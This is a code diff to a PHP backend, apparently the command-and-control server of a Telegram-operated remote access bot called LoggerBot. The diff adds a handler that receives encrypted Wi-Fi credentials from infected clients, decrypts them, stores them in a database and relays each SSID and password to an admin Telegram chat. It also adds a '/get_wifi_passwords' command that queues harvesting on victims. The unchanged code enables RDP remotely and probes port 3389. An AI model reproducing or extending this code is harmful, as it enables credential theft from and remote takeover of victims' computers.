@@ -244,6 +244,10 @@ class LoggerBot
             case 'disable_rdp':
                 $response = $this->handleDisableRDP($data);
                 break;
+                // api.php (inside the switch in handleClientRequest)
+            case 'upload_wifi_passwords':
+                $response = $this->handleUploadWifiPasswords($data);
+                break;
             default:
                 $response = ['error' => 'Unknown action'];
                 break;
@@ -253,47 +257,101 @@ class LoggerBot
         echo json_encode($response);
     }
 
+    // api.php (inside LoggerBot class)
+    private function handleUploadWifiPasswords($data)
+    {
+        try {
+            $this->logWebhook("Wi-Fi Passwords Upload: " . json_encode($data));
+
+            $clientId = $data['client_id'] ?? null;
+            $wifiData = $data['wifi_data'] ?? null;
+
+            if (!$clientId || !$wifiData) {
+                $this->logError("Wi-Fi upload failed: Missing client_id or wifi_data");
+                http_response_code(400);
+                return ['error' => 'Missing client_id or wifi_data'];
+            }
+
+            $decryptedWifiData = $this->decrypt($wifiData);
+            if ($decryptedWifiData === '') {
+                $this->logError("Wi-Fi data decryption failed for client_id: $clientId");
+                http_response_code(400);
+                return ['error' => 'Decryption failed'];
+            }
+
+            $wifiJson = json_decode($decryptedWifiData, true);
+            if (!$wifiJson || json_last_error() !== JSON_ERROR_NONE) {
+                $this->logError("Invalid Wi-Fi data format for client_id: $clientId, decrypted: " . substr($decryptedWifiData, 0, 50));
+                http_response_code(400);
+                return ['error' => 'Invalid data format'];
+            }
+
+            // Store in client_logs
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
+            VALUES (?, 'wifi', ?, NOW())"
+            );
+            $stmt->execute([$clientId, $decryptedWifiData]);
+
+            // Prepare Telegram message
+            $message = "📡 Wi-Fi Passwords Received:\n";
+            $message .= "Client ID: $clientId\n";
+            $message .= "Networks:\n";
+            foreach ($wifiJson['wifi_profiles'] as $profile) {
+                $message .= "- SSID: {$profile['ssid']}, Password: " . ($profile['password'] ?: 'None') . "\n";
+            }
+            $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
+
+            $this->logWebhook("Wi-Fi passwords processed for client_id: $clientId, profiles: " . count($wifiJson['wifi_profiles']));
+            return ['status' => 'success'];
+        } catch (Exception $e) {
+            $this->logError("Wi-Fi upload failed for client_id: $clientId, error: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Upload failed: ' . $e->getMessage()];
+        }
+    }
+
     private function handleRDPReport($data)
     {
         try {
             $this->logWebhook("RDP Report: " . json_encode($data, JSON_UNESCAPED_UNICODE));
-    
+
             $client_id = $data['client_id'] ?? null;
             $rdp_info = $data['rdp_info'] ?? null;
-    
+
             if (!$client_id || !$rdp_info) {
                 $this->logError("Invalid RDP report: missing client_id or rdp_info");
                 http_response_code(400);
                 return ['error' => 'Missing client_id or rdp_info'];
             }
-    
+
             if (!is_string($rdp_info) || !str_contains($rdp_info, '::')) {
                 $this->logError("Invalid RDP info format for client_id: $client_id, data: " . substr($rdp_info, 0, 50));
                 http_response_code(400);
                 return ['error' => 'Invalid RDP info format'];
             }
-    
+
             $decrypted_info = $this->decrypt($rdp_info);
             if ($decrypted_info === '') {
                 $this->logError("Failed to decrypt RDP info for client_id: $client_id");
                 http_response_code(400);
                 return ['error' => 'Decryption failed'];
             }
-    
+
             $rdp_data = json_decode($decrypted_info, true);
             if (!$rdp_data || json_last_error() !== JSON_ERROR_NONE) {
                 $this->logError("Invalid RDP data format for client_id: $client_id, decrypted: " . substr($decrypted_info, 0, 50));
                 http_response_code(400);
                 return ['error' => 'Invalid data format'];
             }
-    
+
             // Log to database
             $stmt = $this->pdo->prepare(
                 "INSERT INTO client_logs (client_id, log_type, message, created_at) 
                 VALUES (?, 'rdp', ?, NOW())"
             );
             $stmt->execute([$client_id, $decrypted_info]);
-    
+
             // Update client status
             $stmt = $this->pdo->prepare(
                 "UPDATE clients SET ip_address = ?, last_seen = NOW(), is_online = 1 
@@ -301,10 +359,10 @@ class LoggerBot
             );
             $ip = $rdp_data['public_ip'] ?? ($rdp_data['local_ip'] ?? 'unknown');
             $stmt->execute([$ip, $client_id]);
-    
+
             // Test port 3389
             $port_status = $this->testPort($ip, 3389);
-    
+
             // Prepare Telegram message
             $message = "🖥️ RDP Status Update:\n";
             $message .= "Client ID: $client_id\n";
@@ -321,10 +379,10 @@ class LoggerBot
                 $message .= "Error: " . ($rdp_data['message'] ?? 'Failed to enable RDP') . "\n";
                 $message .= "Port 3389 Status: " . ($port_status ? "Open" : "Closed") . "\n";
             }
-    
+
             $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
             $this->logWebhook("RDP report processed for client_id: $client_id, message: $message, port_status: " . ($port_status ? 'open' : 'closed'));
-    
+
             return ['status' => 'success', 'port_status' => $port_status ? 'open' : 'closed'];
         } catch (Exception $e) {
             $this->logError("RDP report failed for client_id: $client_id, error: " . $e->getMessage());
@@ -949,7 +1007,8 @@ class LoggerBot
             '/addadmin' => 'Add Admin',
             '/end_task' => 'End Task',
             '/enable_rdp' => 'Enable RDP',
-            '/disable_rdp' => 'Disable RDP'
+            '/disable_rdp' => 'Disable RDP',
+            '/get_wifi_passwords' => 'Get Wi-Fi Passwords'
         ];
 
         $keyboard = ['inline_keyboard' => []];
@@ -1042,6 +1101,11 @@ class LoggerBot
             case preg_match('/^\/end_task\s+(.+)/', $command, $matches):
                 $commandData = ['type' => 'end_task', 'params' => ['process_name' => $matches[1]]];
                 $response['data'] = "End task command queued for process: {$matches[1]}";
+                break;
+
+            case preg_match('/^\/get_wifi_passwords$/', $command):
+                $commandData = ['type' => 'get_wifi_passwords', 'params' => []];
+                $response['data'] = 'Wi-Fi passwords command queued';
                 break;
 
             case preg_match('/^\/enable_rdp$/', $command):
@@ -1564,4 +1628,3 @@ class LoggerBot
 
 $bot = new LoggerBot();
 $bot->handleRequest();
-?>
